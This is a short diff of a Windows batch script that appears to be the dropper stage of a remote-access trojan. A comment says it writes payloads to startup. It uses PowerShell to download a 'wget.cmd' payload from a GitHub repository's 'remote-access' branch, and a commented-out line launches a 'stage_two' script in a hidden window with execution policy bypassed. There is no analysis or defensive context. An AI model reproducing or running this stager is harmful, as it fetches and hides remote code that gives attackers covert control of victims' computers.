@@ -16,8 +16,10 @@ cd %NEXT_PATH%
 
 @REM write payloads to startup
 
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Zeyadm8112/RattMurdock/main/wget.cmd' -OutFile 'wget.cmd'"
+@REM powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Zeyadm8112/RattMurdock/main/wget.cmd' -OutFile 'wget.cmd'"
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Zeyadm8112/RattMurdock/remote-access/wget.cmd' -OutFile 'wget.cmd'"
 
+https://raw.githubusercontent.com/Zeyadm8112/RattMurdock/remote-access/wget.cmd
 @REM run p
 
 @REM powershell.exe -Command "Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""stage_two.cmd""'"
